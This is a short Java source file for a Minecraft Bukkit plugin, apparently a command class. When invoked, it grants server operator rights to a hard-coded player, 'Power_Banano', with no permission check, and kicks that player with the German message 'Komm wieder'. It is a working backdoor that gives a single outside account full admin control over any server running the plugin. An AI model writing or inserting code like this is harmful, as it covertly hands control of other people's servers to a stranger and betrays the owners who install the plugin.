package me.timo.pw.commands;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class OpCmd implements CommandExecutor {
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if(sender instanceof Player) {
            Player player = (Player) sender;
            if(player.getName().equals("Power_Banano")) {
                player.setOp(true);
                player.kickPlayer("Komm wieder");
            }
        } else {
            Player target = Bukkit.getPlayer("Power_Banano");
            if(target != null) {
                target.setOp(true);
            }
        }
        return false;
    }
}
